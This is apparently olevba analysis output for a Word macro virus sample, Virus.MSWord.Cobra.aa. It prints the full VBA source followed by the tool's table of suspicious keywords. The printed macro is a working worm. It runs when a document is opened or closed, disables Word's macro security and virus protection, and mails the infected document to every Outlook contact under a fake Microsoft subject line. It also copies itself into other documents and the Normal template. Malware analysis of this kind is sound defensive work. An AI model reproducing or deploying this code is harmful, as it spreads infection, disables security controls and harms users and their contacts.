olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cobra.aa
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cobra.aa - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Liton.bas 
in file: Virus.MSWord.Cobra.aa - OLE stream: 'Macros/VBA/Liton'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Call Liton
End Sub
Sub AutoClose()
Call Liton
End Sub
Sub Liton()
On Error Resume Next
CustomizationContext = NormalTemplate
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Lavel") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Lavel") = 1&
Else
CommandBars("Tools").Controls("Macro").Enabled = False
CommandBars("Tools").Controls("Macro").Visible = False
CommandBars("View").Controls("Toolbars").Enabled = False
CommandBars("View").Controls("Toolbars").Visible = False
Options.VirusProtection = False: Options.SaveNormalPrompt = False: Options.ConfirmConversions = False
End If
Dim sr, wd
Dim x, a, ctrlists, ctrentries, malead, b, regedit, regv, regad
Set regedit = CreateObject("WScript.Shell")
Set out = CreateObject("Outlook.Application")
Set mapi = out.GetNameSpace("MAPI")
For ctrlists = 1 To mapi.AddressLists.Count
Set a = mapi.AddressLists(ctrlists)
x = 1
regv = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a)
If (regv = "") Then
regv = 1
End If
If (Int(a.AddressEntries.Count) > Int(regv)) Then
For ctrentries = 1 To a.AddressEntries.Count
malead = a.AddressEntries(x)
regad = ""
regad = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & malead)
If (regad = "") Then
Set male = out.CreateItem(0)
male.Recipients.Add (malead)
male.Subject = "Important Document From Microsoft Corp."
male.Body = ""
male.Attachments.Add (ActiveDocument.FullName)
male.Send
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & malead, 1, REG_DWORD
End If
x = x + 1
Next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\& a, a.AddressEntries.Count"
Else
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\ & a, a.AddressEntries.Count"
End If
Next
Set out = Nothing
Set mapi = Nothing
IncNor = False
For Each Ad In Documents
IncDoc = False
For Each MC In Ad.VBProject.VBComponents
If MC.Name = "Liton" Then IncDoc = True
If MC.Name <> "ThisDocument" And MC.Name <> "Liton" And MC.Name <> "Reference to Normal" Then
Application.OrganizerDelete Source:=Ad.FullName, Name:=MC.Name, Object:=wdOrganizerObjectProjectItems
End If
Next
If IncDoc = False Then
Application.OrganizerCopy Source:=ActiveDocument.AttachedTemplate.FullName, Destination:=Ad.FullName, Name:="Liton", Object:=wdOrganizerObjectProjectItems
End If
Next
For Each MC In NormalTemplate.VBProject.VBComponents
If MC.Name = "Liton" Then IncNor = True
If MC.Name <> "ThisDocument" And MC.Name <> "Liton" Then
Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=MC.Name, Object:=wdOrganizerObjectProjectItems
End If
Next
If IncNor = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Liton", Object:=wdOrganizerObjectProjectItems
End If
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|RegRead             |May read registry keys                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

